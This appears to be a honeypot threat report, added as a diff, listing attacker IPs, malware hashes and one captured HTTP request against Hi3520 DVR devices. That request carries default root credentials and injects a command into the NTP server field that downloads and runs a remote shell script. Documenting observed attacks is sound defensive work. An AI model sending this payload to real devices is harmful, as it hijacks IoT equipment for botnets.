@@ -1,0 +1,31 @@
+Top 5 IPs for 10-11-2024 :
+
+14.48.227.118
+8.138.102.248
+172.245.177.158
+45.148.10.46
+190.215.128.223
+
+Malware Observed:
+
+File name : sshd
+111ba3f3d02d476fb5b64fe1c0cb67fdfeb1d6981d28f87a804edd915c32b02b
+https://www.virustotal.com/gui/file/111ba3f3d02d476fb5b64fe1c0cb67fdfeb1d6981d28f87a804edd915c32b02b
+
+File name : sshd
+cfeb3fa9c6d80066bf3e75b9de1785714d607aa6dd15dedaec2bde9b7e62d246
+https://www.virustotal.com/gui/file/cfeb3fa9c6d80066bf3e75b9de1785714d607aa6dd15dedaec2bde9b7e62d246
+
+
+
+Commands/exploits observed :
+
+
+POST /dvr/cmd HTTP/1.1
+Host: HOST
+Accept-Encoding: gzip, deflate
+Content-Length: 332
+Authorization: Basic cm9vdDppY2F0Y2g5OQ==
+User-Agent: Abcd
+
+<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov&wget -O- http://82.55.220.172/wget.sh|sh;echo DONE\"/></Service></DVR>]]></SetConfiguration></DVR>
